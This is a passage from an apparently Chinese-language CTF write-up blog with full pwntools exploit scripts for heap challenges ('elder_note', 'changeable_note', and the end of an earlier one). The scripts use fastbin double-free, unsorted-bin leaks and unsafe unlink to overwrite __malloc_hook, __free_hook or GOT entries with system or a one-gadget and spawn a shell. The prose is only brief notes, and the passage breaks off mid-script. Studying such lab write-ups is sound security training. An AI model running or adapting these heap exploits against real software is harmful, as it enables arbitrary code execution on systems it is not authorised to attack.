delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token operator">*</span><span class="token string">b'X'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

<span class="token comment"># 分割 unsorted bin</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'pad'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'pad'</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
__malloc_hook <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x10</span>
leak<span class="token punctuation">(</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">,</span> __malloc_hook<span class="token punctuation">)</span>
lbase <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
lsys <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
__free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>lsys<span class="token punctuation">)</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>

irt<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="elder-note"><a href="#elder-note" class="headerlink" title="elder_note"></a>elder_note</h2><p>libc-2.23.so</p>
<p>fastbin attack，fastbin 的校验不大严格，可以 UAF</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">rs</span><span class="token punctuation">(</span>arg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> p
    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token string">'remote'</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>host<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> binary<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>arg<span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span>
binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./note'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
ld   <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'unsorted_bin'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'protected_bin'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
__malloc_hook <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> <span class="token number">16</span>
leak<span class="token punctuation">(</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">,</span> __malloc_hook<span class="token punctuation">)</span>
lbase <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
lsystem <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
realloc <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>
gadget <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x4525a</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment"># 复位</span>

<span class="token comment"># fastbin attack</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'fastbin'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x68</span> <span class="token punctuation">,</span> <span class="token string">b'guard'</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment"># Arbitrary Alloc </span>
add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook <span class="token operator">-</span> <span class="token number">0x1b</span> <span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">,</span> __malloc_hook<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> lsystem<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x13</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>realloc<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span><span class="token string">b'test'</span><span class="token punctuation">)</span>

irt<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="changeable-note"><a href="#changeable-note" class="headerlink" title="changeable_note"></a>changeable_note</h2><p>libc-2.31.so 保护没开好，RELRO ，可以劫持 GOT 表，而且 PIE 也没有开，如果开了（就不知道怎么打了。这题的知识点主要是 unsorted bin unlink，后面我还用到了 off by X，合并了再泄露，但是其实没什么必要，因为一次 unlink 可以覆盖很多指针。</p>
<p>这里我利用 how2heap 中的 unsafe_unlink 把原理画一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220407135121252.png" alt="image-20220407135121252"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">rs</span><span class="token punctuation">(</span>arg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> p
    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token string">'remote'</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>host<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> binary<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>arg<span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span>
binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./note'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
ld   <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'index?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'size?\n>> '</span> <span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'content?\n>> '</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'index?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'index?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
note <span class="token operator">=</span> <span class="token number">0x4040C0</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'chunk0'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'chunk1'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'protected_chunk'</span><span class="token punctuation">)</span>
<span class="token comment"># 构造 fake chunk</span>
pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>note<span class="token operator">-</span><span class="token number">3</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>note<span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> pay<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xA0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>
<span class="token comment"># unlink </span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
plt_puts <span class="token operator">=</span> binary<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
got_free <span class="token operator">=</span> binary<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>
leak<span class="token punctuation">(</span><span class="token string">'plt_puts'</span><span class="token punctuation">,</span> plt_puts<span class="token punctuation">)</span>
<span class="token comment"># 实施 unlink 后的指针覆盖</span>

edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_free<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
<span class="token comment"># edit(0, p64(plt_puts)[:-1] + b'\n')</span>
<span class="token comment"># delete(0)</span>


<span class="token comment"># 取关之前的 unsortedbin</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">b'fake'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token string">b'fake'</span><span class="token punctuation">)</span>

<span class="token comment"># off by one</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">b'chunk1'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">b'chunk2'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">b'chunk3'</span><span class="token punctuation">)</span>
